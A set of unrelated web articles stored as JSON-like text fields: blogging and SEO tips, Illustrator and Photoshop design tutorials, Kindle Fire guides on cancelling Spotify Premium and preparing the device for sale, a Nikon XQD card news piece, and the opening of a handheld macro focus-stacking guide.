tips here on how you can update old content. \nClick To Tweet \n2. Craft a New Headline \nAccording to a recent study by Microsoft, the average attention span has fallen to a mere 8 seconds. 8 seconds is all you have to captivate your audience and convince them to stay. \nFor this reason, it\u2019s imperative to examine your title to ensure it\u2019s the best it can be \u2014 it\u2019s your first and sometimes only opportunity to engage your reader. \nIf your post was titled, \u201c6 Ways to Wow Your Audience,\u201d why not add a seventh or even an eighth? Once you think you\u2019ve got something eye-catching, don\u2019t simply trust your gut, give it a test run. \nTo do so, try the AMI Institute\u2019s Headline Analyzer . It\u2019s a useful tool for any writer that ranks your headline according to how well it resonates with your audience based on three key types of appeal: intellectual, emotional or spiritual. \nIt also gives you a percentile score which indicates how powerful your title is. Most professional copywriters\u2019 headlines will fall between 30%-40% range, while the most talented will have a 50%-75% score. Test yours to see where you land. If it\u2019s not quite right, keep trying. \nHere\u2019s an example of a Write Blog headline hitting a 40% score: \nIf you\u2019re stuck and need more help, check out my video on writing killer headlines for more tips. \nHow you write today can be wayyy different than how it was years ago. To make sure that all your copies reflect your latest awesome writing style, power up those headlines. There's even a tool to help you craft the best one! \nClick To Tweet \n3. Update Images & Copy in Your Post \nIf your blog is mostly text and there are little to no images, you may want to consider adding a few more. Images help the reader stay actively engaged by breaking up content. \nIn fact, they\u2019re so important that one study found that when asked after three days, participants could only recall 10-20% of written information provided to them during the test but were able to recall a whopping 65% of the visual information. \nThis is why images are a huge component of any successful blog\u2019s goal to maintain viewership. \nInfographic from Ethos3 \nAnd, what\u2019s better than an image? An infographic. \nInfographics can help you show off incredible statistics, like the one above, in a simple format that will impress your readers and make them more likely to share your content. \nIf your blog is fun and lighthearted, you might try adding GIFs. They make a perfect pair to content that makes readers laugh out loud. \nJust keep in mind that page load time is also a factor. If your post already takes a moment to pop up, you may want to reconsider using them. \nVery few readers will wait a full 10 seconds to begin reading. \nThink about the copy itself, too. If you have typos, content and quality issues, now is the time to address all of those. Quality in writing goes a long way in convincing and converting a reader. \nEnhance your old content's readability \u200d by adding attractive yet informative images. Besides keeping those long posts easier to read, they help readers recall information better. \nClick To Tweet \n4. Finesse Your Meta Content & CTA \nThere are two final components of any successful content update. These are your meta content and your call to action or CTA . \nMake Sure to Add or Update the Meta Title and Description \nYour meta content is a combination of two items \u2014 your meta title and meta description. \nThe meta title is the headline that appears on search pages when users search for you or any content related to your site. \nYour meta description is the small blurb beneath your site\u2019s title on Google\u2019s search page which tells readers what they are about to click on. \nThe critical meta title and description are a \u2018must\u2019 for optimal SEO and can also be the deciding factor between a user clicking on your site or choosing one of the thousands of others available to them. \nWhile there are many strategies regarding how to optimize, the main goal is to be specific. \nIn the example above, our meta title is Why Blog? 52 Incredible Blogging Statistics to Inspire You . This is highly specific to our topic and interesting to the reader. Bonus: It has numbers! Numbers are great to draw readers\u2019 eyes. \nIf your post is about options for gardening services in Southern California, the meta title should not be something generic. For example, \u201cGardeners for Your Home\u201d is an extremely weak meta title. A better option is one that is not only location-specific, (e.g. Southern California) but one that also includes keywords. \u201cHow to Find the Best Gardener in Southern California: 5 Steps to a Great Partnership\u201d is not only specific but contains all of the keywords associated with your content. \nThis lets both the reader and search engines know precisely what your site contains. By using targeted language, it increases the chance that you will rank higher and viewers will choose your site. \nYour meta description should also be similarly crafted. It is an extension of your title and should contain a small snapshot of carefully selected keywords and phrases that relate to your page\u2019s topic. \nIf this is all new to you and you want to learn how to write powerful meta descriptions, check out our guide on how to write meta content . \nNever leave your snippets unedited . Be sure to add or update that old meta title and description and feel free to rewrite them until you're sure that they have the right length that perfectly tells what your content is about. \nClick To Tweet \nAdd CTAs Too When Updating Old Content \nThe last and arguably one of the most important factors to creating conversions is your call to action or CTA. \nThese can be placed within a sentence, like the one above, a button on your site or a pop-up window within your blog that encourages the reader to take action in some way. \nBusinesses spend countless dollars each year researching how to effectively leverage the color, position, and wording of their CTAs so they can get their customers to the next section of their funnel. \nHere\u2019s an example: \nEach of these two buttons is a CTA, but they both have one goal: Transform a visitor into a consumer. The only difference is the wording. One focuses on stoking enthusiasm and curiosity, \u201cEveryone loves us.\u201d The other acts as a mirror encouraging you to try the thing everyone loves and to do it now. \nWhile tactics like using scarcity to induce a feeling of FOMO like \u201cBuy now before we run out,\u201d are effective, what\u2019s more effective is knowing your audience. While some companies would cringe at a CTA that says, \u201cGet yo goods,\u201d for another, it\u2019s the perfect CTA for their clients. \nWhy? Because it fits their brand and their product. By knowing who your readers are and what they want, you can craft CTAs that are lightyears ahead of the average \u201cBuy now,\u201d button. Then, sit back and watch the conversions roll in. \nBy creating an enticing CTA within rather than just hoping a reader will take action, the chances increase exponentially that they will like, subscribe, or purchase that ebook you worked so hard on. \nWhile we could spend pages talking about how to write a CTA \u2014 and we have \u2014 if you need some inspirational tips on how to write a CTA that\u2019s guaranteed to generate conversions, head over to our piece about how to write a sensational CTA after you finish here. \nSee what we did there? \nNever miss adding call-to-action aka CTAs . CTAs invite readers to go to your next desired step such as subscribing to your newsletter , purchasing an item , or just reading another post to keep them hooked on your site! \ud83e\ude91 \nClick To Tweet \n4. Republishing: How to Show Off Your New Bling \nCongratulations, you\u2019ve done it! \nYou braved the journey into your content gold mine and came out with some incredible pieces. After a bit of hard work, they are now gleaming. \nNow comes the fun, reposting. \nWhen you repost, I recommend including a small note at the top stating when the piece was updated. This lets readers know that it\u2019s hot off your fingertips and worthy of reading. Here\u2019s an example of how we\u2019ve done that: \nIf you\u2019re worried your audience won\u2019t respond because they have already seen the post, it\u2019s important to remember that it\u2019s not the same content you had before. You\u2019ve transformed it into something trendy and relevant. \nIt\u2019s also good to keep in mind that the value of your blog is not in the immediate viewership achieved but in the potential thousands who will visit in the future. \nBy following our simple steps above to keep your blog updated, you\u2019ll boost your visitor count and earn consistently higher traffic numbers to your content. \nBefore you hit that Update button, leave a small note at the top that tells when the post was originally written and when it was updated. \ud83e\uddfdThis lets the readers know your old post is refreshed and has new details not to be missed. \nClick To Tweet \nExtra Ways to Make Your Post Sparkle \nIf you\u2019re still looking for new ways to update your old content after doing all of the tips above, consider a few of the extra options below. \nDo you have a podcast or will you be featured in one soon? Think about how you can integrate your piece into the recording. \nTry rewriting it as a script or mentioning a small snippet to encourage listeners to give it a read. \nIf you have an active email campaign that keeps your readers engaged with your site, use it to show off work they may not have seen yet. \nTake an excerpt from the posts you\u2019re revamping and include it in your next email campaign. Then, create a CTA that encourages readers to \u201cCheck out the whole article\u201d and provide a link. \nIf you\u2019ve read all of this and think, \u201cgee this is just too much,\u201d that\u2019s okay too!

      "text": "Welcome back to another Illustrator based tutorial, in which we\u2019re going to take an in-depth look at the process of creating a camera app icon, using a couple of basic geometric shapes that we\u2019re going to adjust here and there. \nSo, assuming you already have the software up and running, let\u2019s jump straight into it! \nTutorial Details: Camera App Icon \nProgram: Adobe Illustrator CS6 \u2013 CC 2019 \nDifficulty: Beginner \nTopics Covered: Design Theory, Compositional Construction, Shape Alignment, Grid Positioning \nEstimated Completion Time: 25 Minutes \nFinal Image: Camera App Icon \nStep 1 \nAs with every new project, we\u2019re going to kick things off by setting up a New Document , by heading over to File > New (or by using the Control-N keyboard shortcut), which we will then adjust as follows: \nNumber of Artboards: 1 \nWidth: 64 px \nHeight: 64 px \nUnits: Pixels \nAnd from the Advanced tab: \nColor Mode: RGB \nRaster Effects: Screen (72ppi) \nPreview Mode: Default \nQuick tip: most of the indicated settings can be automatically triggered if you set the document\u2019s Profile to Web , the only one that you\u2019ll have to manually adjust being the Artboard\u2019s Size ( Width x Height ). \nStep 2 \nAs soon as we\u2019ve finished setting up our project file, we can start working on the actual camera app icon, and we will do so by creating the camera app icon\u2019s main body using a 56 x 40 px rectangle, which we will color using #ff9248 and then horizontally center align to the underlying Artboard , positioning it at a distance of 8 px from its bottom edge. \nStep 3 \nStart adjusting the shape that we\u2019ve just created, by grabbing the Add Anchor Point Tool ( + ) and then adding a new anchor point to the center of each of its edges by simply clicking on them. \nStep 4 \nQuickly remove the corner anchor points , by first switching over to the Delete Anchor Point Tool ( \u2013 ) and then simply clicking on them. \nStep 5 \nNext, we need to turn on the Pixel Preview mode using the Alt-Control-Y keyboard shortcut, and after converting the resulting shape\u2019s anchor points to smooth with the help of the Convert selected anchor points to smooth function, adjust the position of their endpoints using the reference image as your main guide. Take your time, and once you\u2019re done don\u2019t forget to turn of the Pixel Preview mode ( Alt-Control-Y ) before moving on to the next step. \nStep 6 \nCreate the main shape for the lens cutout using a 20 x 20 px circle with a 4 px thick Stroke (highlighted in red), which we will position to the center of the camera app icon\u2019s body. \nStep 7 \nExpand the ring that we\u2019ve just created by heading over to Object > Expand > Fill & Stroke , and then cut out the resulting shape from the larger underlying body by selecting them both and then using Pathfinder \u2019s Minus Front Shape Mode . \nStep 8 \nAdd the smaller cutout using a 4 x 4 px circle, which we will position at a distance of 8 px from the larger body\u2019s top and right edges, removing it afterward using the Minus Front Shape Mode . \nStep 9 \nCreate the main shape for the camera app icon\u2019s upper body using a 28 x 16 px rectangle, which we will color using #ff9248 and then position above the ring cutout, as seen in the reference image . \nStep 10 \nFinish off the camera app icon and with it the project itself, by adjusting the corners of the shape that we\u2019ve just created, by opening up the Transform panel, and then setting the radius of its upper corners to 10 px . Once you\u2019re done, don\u2019t forget to select and group all of the icon\u2019s composing shapes together using the Control-G keyboard shortcut. \nAwesome Work! \nAs always, I hope you had fun working on the project and most importantly managed to learn something new and useful during the process. \nThat being said, if you have any questions feel free to post them within the comments section and I\u2019ll get back to you as soon as I can! \nAuthor: Andrei \u0218tefan \nJust another coffee addict / pixel grinder, creating colorful projects one pixel at a time. \nThe post How to Create a Camera App Icon appeared first on Vectips .",

      "title": "How to Cancel Spotify Premium on Your Amazon Fire Tablet",
      "text": "Before Spotify became the behemoth it is today, the music streaming app didn\u2019t offer its services on Amazon\u2019s Fire OS. Unless you tweaked your Fire OS to read Android apps, it was impossible for Kindle Fire users to listen to Spotify on their device. \nAll that changed in 2012, when Spotify decided to introduce its premium services for Kindle Fire users. This version gave owners access to the standard fleet of Spotify features, including offline listening, integration with Facebook, and access to its massive catalog of songs. Using the premium version also meant that your listening experience wasn\u2019t constantly interrupted with annoying ads. Obviously, you had to pay Spotify Premium\u2019s subscription fees of $9.99 to avail these features, but it was yet another utility in Kindle Fire\u2019s already impressive range. \nOver the years, however, with other music streaming companies emerging in the business, Spotify Premium members have had more choices. The introduction of YouTube Music, Tidal and the expansion of Apple Music has led some users wanting to defect from Spotify. Whether or not that\u2019s a reason for you deciding to cancel Spotify Premium on your Kindle Fire, this is how you go about doing it. \nStep 1 \nOpen the Spotify app on your Kindle Fire tablet. On the Account page, select the Subscription option from the left navigation menu on the screen. \nStep 2 \nHere you\u2019ll find the details of your subscription plan. Underneath these details, Spotify gives you the option of either changing your plan type or canceling it altogether. If you\u2019re not interested in checking out other plans and have decided to call it quits, select the Cancel Premium option. Spotify will ask you for a confirmation, to which you click Yes. \nStep 3 \nThat\u2019s pretty much it. You\u2019ll have successfully canceled the Spotify Premium membership by following these steps. But remember, you can still enjoy the full range of Premium\u2019s service till your next billing date, which is when your app will revert to the free version. \nJust make sure that you\u2019re canceling your subscription well in advance of the billing date. If you cancel your Premium service too close to the billing date, there\u2019s a possibility that the app has already processed your transaction. In such a scenario, your cancelation won\u2019t take effect until another month has passed. That\u2019s not an ideal situation for anyone trying to cancel a service, but hey, always better to cancel with a bit of foresight. \nThe Free Version of Spotify Is Not Altogether Bad \nAdmittedly, the free version of Spotify comes nowhere close to the features offered by the Premium version, but it\u2019s not the worst music-streaming option out there. Yes, you get your music constantly interrupted with ads. And yes, you\u2019ll only be able to shuffle albums and artists outside of the personalized playlists Spotify provides. Then again, it\u2019s all for free! \nSpotify Premium also provides a free trial depending on where you\u2019re using the app. Therefore, if you\u2019ve not had a taste of the service yet, we\u2019d recommend you get a free trial before deciding on whether you want to use it on your Kindle Fire. \nReactivation of Account \nIf you decide to give Spotify Premium another try after cancelation, make sure you do so within three months of canceling the service. Spotify saves your playlists and settings for three months after cancelation, so you can pick up from where you left off. \nWhat If I Want to Get Out Permanently? \nCanceling the Spotify Premium service doesn\u2019t mean that your account has been closed. As already mentioned, you can continue using the free version of the app. But if for some reason you want to opt out permanently, you can go to the Spotify help site on your desktop. Search for Spotify\u2019s account form, where you\u2019ll get the option to Close Account under the Account Help tab. Doing this is an irreversible process leading to the permanent deletion of your account from the Spotify database. \nWe hope this guide helped you cancel your Spotify Premium on the Kindle Fire tablet. In case you have another related query, or want to chip in with some tips and tricks, please feel free to comment in the section below. \nHappy listening!",

      "title": "Create an Easy Folded Paper Text Effect in Photoshop",
      "text": "In this Photoshop tutorial, we will explore an easy technique to simulate a folded paper text effect, like those we generally see in origami examples. \nFinal Image \nThis is the final image that we\u2019ll be creating: \nTutorial Details \nProgram: Adobe Photoshop CS6 \nEstimated Completion Time: 50 minutes \nDifficulty: Beginner-Intermediate \nStep 1 \nOpen a new file (File > New) in Adobe Photoshop using the following settings. Save the file as \u201cFolded Paper Text Effect.psd\u201d. During work remember to frequently use File > Save (Ctrl + S) to save and update the file. \nStep 2 \nLet\u2019s start creating the initial shapes. Then we will create the paper folds. There are many ways we can do this in Photoshop. But what we are looking for is a way which will be flexible enough for us to change or modify easily later. So we will start with the Rectangle Tool, from the Shapes Tools group. \nAll Shape Tools create vector shapes in Photoshop. Vector shapes are ideal for those crisp, clean lines. Also they are easy enough to modify or edit later. \nFor this tutorial we will use the Rectangle Tool only. To create a rectangle, first select the Rectangle Tool and then click and drag to create a rectangle. \nTo create a perfect square use the SHIFT+Click and drag method. Also to create a perfect square from the center of that square use SHIFT+ALT+Click and drag method. \nSo now we know how to create a rectangle. But then how to do we edit it? \nUse Path Selection Tool (Black arrow) and the Direct Selection Tool (White Arrow) to edit the shapes. \nFor transform, rotate and scale use the Path Selection Tool. But for editing the individual points (i.e. Anchor Points) use the Direct Selection Tool. \nFor inserting or deleting a new point use the Add Anchor Point tool or the Delete Anchor Point Tool from the Pen Tool group. \nStep 3 \nSelect the Rectangle Tool from the shape Tool and change the fill color option from the Option Bar above to a Medium Gray (#808080). \nStep 4 \nNow create a rectangle and then select the Direct Selection Tool. Move and reposition the points as shown below. \nStep 5 \nRename the Shape layer to \u201c2-01\u201d by double clicking on the text. Duplicate this layer by either Right-Click on the layer in the Layer Panel or press CTRL+J.Then rename it to \u201c2-02\u201d. \nStep 6 \nThen select the Path Selection Tool and click on the path to select the path. Then from Edit> Transform Path> Rotate or CTRL+T. Rotate the path, then select the Direct Selection Tool. Now adjust the points and position this shape by following the screenshot below: \nStep 7 \nFollow the same steps to finish the letter \u201c2\u201d. Use the below screenshot as a guide. \nSelect all these Shape Layers and create a group with the name \u201c2\u201d. \nStep 8 \nDouble click on the layer \u201c2-01\u201d to open the layer style. You can also target the layer by clicking on it and then below the layer panel, click on the button that looks like \u201cfx\u201d and select Gradient Overlay. First change the angle of the gradient to -104 degrees. Then click on the Gradient Editor to create a gradient as shown below. \nStep 9 \nRight-Click on the layer \u201c2-01\u201d and select Copy Layer Style. \nStep 10 \nThen Right-Click on the layer \u201c2-02\u201d and select Paste Layer Style. Then change the angle value to 90. Then open the Gradient Editor of the Gradient Overlay and change the location of each Gradient Color Stop. No need to change the color values. Check below for details. \nStep 11 \nRepeat same technique for layer \u20182-03\u2033. Here are the Gradient Overlay Settings for the layer \u201c2-03\u201d.Color values are the same. \nStep 12 \nGradient Overlay Settings for the layer \u201c2-04\u201d. Same color values. \nStep 13 \nGradient Overlay Settings for the layer \u201c2-05\u201d. Notice the different color values here. \nStep 14 \nGradient Overlay Settings for the layer \u201c2-06\u201d. \nCompleted \u201c2\u201d after Gradient Overlay. \nStep 15 \nNow it\u2019s time to create the fold shapes for \u201c2\u201d. Each fold will be divided into two parts. A front and a back part, where one will hide the other partially to create the simulation of a 3D fold. The technique will be same. \nFirst, create a gray (#808080) colored small rectangle and edit the points with the Direct Selection Tool. Rename this layer to \u201cF-2-01-Front\u201d. Then create a group named \u201cFolds\u201d and put this layer inside this group. \nCheck the screenshot below for Gradient Overlay settings for the front fold layer. \nStep 16 \nThen duplicate this layer and drag the layer down below the previous layer. Now adjust the points to match the screen shot below. \nCheck the screenshot below for Gradient Overlay settings of the back fold layer. \nBelow is the completed first fold of the shape \u201c2\u201d. \nStep 17 \nComplete the second fold for the shape\u201d2\u201d. Screenshots are below. \nCheck the screenshot below for Gradient Overlay settings. \nStep 18 \nBelow is the completed \u201c2\u201d with all the elements. \nStep 19 \nSimilarly, start creating the shape \u201c0\u201d. Duplicate any shape layers from the shape \u201c2\u201d first. Then, with the Direct Selection Tool reposition the points to create the first shape element for the shape \u201c0\u201d. Due to duplication the layer style is still active. So edit the layer style to modify it. Then duplicate this new layer for the shape \u201c0\u201d and edit the points to create the second element. Then continue repeating these steps. Below is the shape \u201c0\u201d after completion of the Gradient Overlay styles, but before the creation of folds. \nStep 20 \nDuplicate and rename any fold layers from the shape \u201c2\u201d and create a new fold for the shape \u201c0\u201d. Then duplicate this layer and repeat. Below are the folds for \u201c0\u201d. \nFirst fold of shape \u201c0\u201d. \nGradient Overlay settings of first fold of \u201c0\u201d \nSecond fold of shape \u201c0\u201d. \nGradient Overlay settings: \nThird fold of shape \u201c0\u201d. \nGradient Overlay settings: \nBelow is the completed \u201c0\u201d with all the elements. \nStep 21 \nSimilarly create the shape \u201c1\u201d. Use the screenshots below as a guide. \nGradient Overlay settings: \nFollow the same process to create the folds for the \u201c1\u201d shape. For details, check the screenshots below: \nFirst fold of shape \u201c1\u201d. \nGradient Overlay settings: \nSecond fold of shape \u201c1\u201d. \nGradient Overlay settings: \nBelow is the completed \u201c1\u201d with all the elements. \nStep 22 \nBelow is the completed \u201c7\u201d with all the elements. \nGradient Overlay settings for all the elements for \u201c7\u201d. \nThere are no folds for the shape \u201c7\u201d. So this will be the easiest one to make. Below is the \u201c7\u201d after completing. \nStep 23 \nAll the shapes for the folded paper text effect are now complete. So it\u2019s time for overall adjustments and adding those small details. Let\u2019s start with some additional shadows for all the shapes. But we will divide this additional shadow into two layers, i.e. soft and crisp. \nExpand the group \u201c2\u201d and CTRL-click on the layer \u201c2-02\u201d shape thumbnail to load that shape as a selection. Then press CTRL+SHIFT and click on the \u201c2-03\u2033 shape layer thumbnail to load that shape as a selection also. Both layer \u201c2-02\u201d and layer \u201c2-03\u201d are loaded as a combined selection. \nStep 24 \nNow create a new layer \u201cShape Shadow Soft\u201d on top of it.Then select a soft brush with black color and paint on the area, which is supposed to be partially under the fold. \nReduce the opacity of the layer \u201cShape Shadow Soft\u201d to 30%. \nStep 25 \nFollow same process to paint more shadows on all the other shapes (0,1 and 7). Remove any unwanted shadow with the Eraser Tool. \nStep 26 \nCreate a new layer on top of the layer \u201cShape Shadow Soft\u201d with the name \u201cShape Shadow Crisp\u201d. Follow same steps to complete creating crisp or hard shadows for all shapes.Then reduce the opacity for the layer \u201cShape Shadow Crisp\u201d to 50%. \nBelow is the completed version. \nStep 27 \nNext we will create some edge highlights like the previous shadow layers. We will divide them into two layers, i.e. soft and sharp. But these edge highlights will be only for the edges. \nCreate a new layer named \u201cEdge Highlights\u201d on top the \u201cFolds\u201d group. Select a small round brush with 75% Hardness. Then paint some edge highlights on the shapes. To do this you need to visualize the light source. Also how many edges will catch light and what will the amount of that light be. Below is the completed Edge Highlight layer. Reduce the opacity of this layer to 20% after painting. \nStep 28 \nNow create a layer on top of the layer \u201cEdge Highlights\u201d with the name \u201cFold Edge Highlights\u201d. These are the highlights on top of the folds developed due to the same light source you visualized before. This time we have to change the brush shape. We need an elliptical brush diameter for this, where the edges are tapered. Press F5 to open the Brush settings or click on the brush icon from the Option Bar. Change the brush shape based on the screenshot below. \nUse Left Third bracket and Right Third Bracket keys to make the brush size large or small. Now start clicking on the fold edges to create the edge highlights. Use the Angle option from the Brush settings to align the brush to the edge, where you are painting. Reduce the opacity of the layer \u201cFold Edge Highlights\u201d to 40%. Below is the completed \u201cFold Edge Highlights\u201d layer. \nStep 29 \nWe are almost there. All that is left to add is a final shadow layer below the 2017 groups. First CTRL-click to select following layers. We use CTRL-click for custom selection or selective selection. Then press CTRL+ALT+E to create a new layer and paste a \u201cmerged\u201d version of the selected layer on it. Use the screenshot below as a guide. \nStep 30 \nDrag this \u201cFolds (merged)\u201d layer down below and position on top of the \u201cBackground\u201d layer. Then ALT+Click on the eye icon at left to turn off all other layer visibility besides this one. \nStep 31 \nOpen level command from Image> Adjustments> Levels. Drag the right Output Level slider towards the left side to darken the \u201cFolds (merged)\u201d layer. \nStep 32 \nFilter> Blur> Gaussian Blur and apply a radius of 10 pixels. \nStep 33 \nNow Edit> Transform> Wrap. Then drag the handles to distort the shadow. This will give a more non uniform perspective shadow, which generally we see below folded or crumpled paper. \nReduce the opacity of this layer to 80%. \nFinal Layer arrangements. \nAnd We\u2019re Done! \nCongratulations! You have successfully completed the Folded Paper Text Effect in Photoshop. But you can still continue working by adding more highlight or shadow details. Use the comments section below to share your final result with us. Below is my final result.",

      "title": "Nikon launches their XQD cards in the USA \u2013 Just as everybody else releases CFexpress",
      "text": "Nikon announced their XQD cards back in August 2018 , but they\u2019re now finally in the USA, just in time to become obsoleted by the wave of CFexpress cards being released by everybody else. It only seems to be available in 64GB capacity, and not the 120GB previously reported , but they are showing as available right now to pre-order from B&H for $129.95 . \nThe release comes just at a time when SanDisk , Delkin , ProGrade , Wise and Lexar have just released their CFexpress cards for order (in the case of SanDisk) or pre-order (everybody else), offering 3-4x the speeds of Nikon\u2019s (or anybody else\u2019s) XQD cards. \nNikon\u2019s XQD cards offer read and write speeds of 440MB/sec and 400MB/sec respectively. Their description of the XQD cards goes a little something like this\u2026 \nDesigned for professional photographers and videographers, the 64GB XQD Memory Card from Nikon is made to excel in high-end DSLR and mirrorless cameras, including the Z 7, Z 6, D5, D500, and D850. It offers a storage capacity of up to 64GB. With support for both PCIe 2.0 and USB 3.0 interfaces, this XQD card features read speeds of up to 440 MB/s and write speeds of up to 400 MB/s, allowing it to record 4K video and continuous raw still image bursts. To make this card more durable, Nikon made the contact pins recessed, which helps protect against damage, dust, and electrostatic shock. Also featured is a strong shell strength for use under demanding conditions, and the ability to withstand temperature extremes from -13 to 149\u00b0F. \nSales of Nikon\u2019s bleeding-edge memory cards start in January 2020, but they\u2019re currently available in 64GB flavour to pre-order for $129.95 , which makes a lot of sense when you can also pre-order a CFexpress card with 128GB capacity boasting more than 3x the read and write speeds (1,700MB/sec & 1,400MB/sec respectively) for as low as $174.99 . \nCFexpress, for those who still haven\u2019t heard, is the drop-in next-generation successor to Sony\u2019s proprietary XQD tech and is set to be manufactured by at least 14 different memory card companies so far including Delkin, Lexar, ProGrade, SanDisk and Wise mentioned above. But joining them will be Sony, Apacer, Biwin, Adata, Western Digital, Egodisk, Delock, Innodisk and Angelbird. \nThe only thing stopping CFexpress \u2013 which was first shown off way back in April 2018 by ProGrade Digital \u2013 from becoming the standard already has been Nikon\u2019s lack of CFexpress support in their camera bodies which contain XQD card slots. All it takes is a firmware update. Until fairly recently, Nikon bodies were pretty much the only things that offered XQD card slots. Now, though, other manufacturers including Panasonic and Phase One have adopted the standard. \nI don\u2019t see any logical reason for Nikon to release their XQD card now unless they\u2019re not planning to release the firmware promised almost a year ago anytime soon and want to corner the XQD market. That might make sense in Nikon\u2019s mind now that pretty much nobody else is making them. \nIf that\u2019s their plan, their market will be quite limited, with Panasonic already having released a firmware patch to upgrade the XQD card slots to CFexpress in their mirrorless bodies. Canon is also expected to house a pair of CFexpress slots in their upcoming 1DX Mark III . I expect many other cameras being announced or released next year will also have ditched formats like CFast 2 to go with CFexpress instead. So, soon, Nikon may once again be the only company using XQD cards. \nI can also see some people starting to switch away from Nikon, too, making their market even smaller now that they\u2019ve decided to make repairs even more frustrating than they already were. I\u2019ve even been considering switching, too. \nI\u2019ve been a Nikon shooter for the better part of two decades now, and currently have 14 Nikon bodies (9 digital, 5 film) but I just can\u2019t take them seriously as a company anymore. I\u2019ll still keep using the Nikons I own until they die or just can\u2019t give me what I want anymore, but when it\u2019s time to buy again, I\u2019m pretty confident I won\u2019t be buying Nikon again. \n[via Nikon Rumors ]",

      "title": "How to Clear Your Kindle Fire to Get it Ready to Sell",
      "text": "You\u2019ve decided to sell your Kindle Fire for some reason \u2013 maybe you are getting an upgrade or maybe you just don\u2019t have any further use for it. Before you put your device up for selling though, there are some important steps for you to take for your sake and make it look like new, at least software-wise, for the future buyer. You have to remove your personal files, get the device\u2019s software to its original condition. and some other things. Here are the crucial steps to take before selling your Kindle Fire. \nDeregister Your Device \nThis is the most important thing to do when preparing your kindle for selling. Since your Kindle Fire is connected to your Amazon account, you don\u2019t ever have to re-enter passwords or other information before buying a book. This is very convenient while you are using your Kindle because it will make every action smoother and faster, but now that you are selling it, you don\u2019t want the buyer to have access to your Amazon account, or more importantly, your payment methods. To do this: \nTap on the three dots to open the dropdown menu. \nTap on Settings. \nOpen My Account. \nTap on Deregister Device. \nA pop-up window will appear for you to confirm this. Tap Deregister again and your Kindle will disconnect from your accounts. \nBack Up Your Files \nYou might want to have the files in the Kindle backed up so you can transfer them to another device. \nBacking Up Files from the Device \nConnect your Kindle Fire to your computer using a USB cable. \nGo to This PC on your computer and open the Kindle Fire drive. \nCopy the folder called \u201cdocuments\u201d to your computer. \nYou can then transfer this folder to your replacement Kindle. \nBacking Up Files from the Cloud \nDownload the Kindle app for your computer. \nOpen the Kindle app \nEnter your Amazon account information to sign in. \nThe app will list all of your Ebooks. \nDownload books to your computer by right-clicking on it and then pressing Download. \nReset to Factory Settings \nThis is to ensure that apps and other content that may be personal to you don\u2019t stay in the Kindle Fire. This will allow the buyer to start from scratch and get all of your stuff out of the way. \nOpen the dropdown menu by clicking the three dots. \nPress Settings. \nPress the menu again. \nPress Reset. \nPress Yes when asked to confirm. \nThe Kindle will then restart. It will take a couple of minutes before it is completely reset. This will bring the Kindle to its factory settings and all of the apps and other files that you have previously downloaded will be removed. \nClean the Device \nBefore you put it up for sale, you should try and clean the device as thoroughly as you can. If you haven\u2019t cleaned your Kindle Fire that often before, this should not be an optional step. Ideally, you should get some screen cleaning wipes but if those aren\u2019t readily available, you can put some rubbing alcohol on a rag and wipe the device down. By cleaning it, you can also take some decent pictures of your Kindle so that it would have a higher chance of selling. \nHow to Sell Your Kindle \nNow that you have your Kindle Fire reset and cleaned, all you have to do is actually sell it. There are many ways to sell your device online and offline, but you should do whatever you can to sell it for the amount that it is worth. Let\u2019s see how you should do it: \nTake Good Pictures of Your Kindle \nIf you want to sell your device online then one of the crucial things you should do is take high-quality photos of it so you can show potential buyers the condition it is in. Get a high-resolution camera or phone camera and put your Kindle down somewhere where there\u2019s a neutral background, preferably with some natural light, and take a few shots. Try to get the pictures from as many angles as possible and choose the ones you like the most. \nDon\u2019t forget to include things like the charger or even the retail packaging the Kindle came in, if you still have it. This will definitely increase the resale value, and who doesn\u2019t want more money, right? \nWhere to Sell Your Kindle \nYou can, of course, sell it at a pawn shop, a garage sale, or to a friend or acquaintance. But if you are looking to sell it online, here are several websites that should sell faster and with less hassle than putting it on Craigslist: \n1. Amazon \nYou can sell your Kindle Fire back to Amazon (Kindle Trade-In) in exchange for an Amazon gift card whose value will depend on the model of your device. This is probably the best option if you want to spend money on Amazon anyway. \n2. eBay \nElectronic devices sell pretty well on the popular auction site, so selling your Kindle there shouldn\u2019t be that difficult and it\u2019s guaranteed to sell if you put it up at a low starting bid with no reserve. Present it well and you will probably get a good price for it. \n3. Radio Shack \nThis electronic chain store is always interested in buying Kindle devices, no matter the model. You can trade it in at the physical store or online, whatever most convenient for you. \nClear and Ready to Sell \nIf you followed all of the steps, you should be able to present your device in the best light on whichever website you plan to list it. Good luck and we hope you get a good price for it! \nAre there any steps that we missed? Know of any other sites to resell a Kindle Fire? Tell us in the comments below!",

      "title": "How to Shoot Handheld Focus Stacks for Macro Photography",
      "text": "Handheld focus stacking is a brilliant solution for many scenarios. It saves you all the troubles of using a focusing rail in the field and provides a maximum of flexibility. Whenever you need more depth of field than you can get with trading off image quality, this is the way to work around it. \nHave a look at the following set of images: the stack was shot handheld. Although it shows some minor shifts in perspective, you wouldn\u2019t know by the final image. The first image in the sequence is the stacked result, followed by the single photos of the stack. \nOf course, it\u2019s ambitious to compete with an actual focusing rail, but with a bit of practice and the right technique, creating a good handheld focus stack becomes a simple task that works well, even at extreme magnification ratios. \n1. The Equipment \nThe typical setup I use for stacking in the field is camera in high-speed continuous mode and an on-camera speedlight with a slim modifier. \nThe flash ensures proper lighting and helps to eliminate motion blur. All ambient light should be cancelled out as we will move the camera back and forth, so take a test shot without flash and make sure it is black. Ideally, the flash power should be set to 1/16th or lower to keep its recharging time short\u2014an external battery pack that holds eight additional batteries helps with this. The camera should be set to the sync-speed of your camera, typically 1/200th or 1/250th of a second. \nIf you dislike black backgrounds, you can use a larger light modifier to shine some light on the background and try to find a composition with a background that is either close to your subject or has a lot of natural light, such as the sky or sun-lit foliage. \n2. The Technique \nPerforming a handheld focus stack is all about a physically stable body position. In order to create a stack that is easy to merge, we need to align the single frames as perfectly as possible. Ideally, the camera moves on only one axis: back and forth. \nAs we slowly move the camera through the zone of focus, we hold the shutter button down and take as many shots as possible. If the buffer fills up or the flash needs to recharge, hold your breath and try not to move the camera or your body until your gear is ready again. Shifting the perspective too much within a stack will ruin it. \nTo ensure this doesn\u2019t happen, use your body as a tripod. \nI typically kneel down or lean against a tree (if possible) and hold my elbows close to my body or rest them on my knees. If the subject is low and the ground is dry, I will lie down and rest my arms on the ground. Then I hold the camera firmly against my face with both hands to hold it steady. I use only my neck to push the camera through the zone of focus, trying my best to move on that one single axis. \nMost subjects in nature are subject to motion blur unless you are lucky and it is windless. Although we made sure this won\u2019t affect the image quality thanks to the high shutter speed and flash, it can still interfere with our focus stack. If the subject 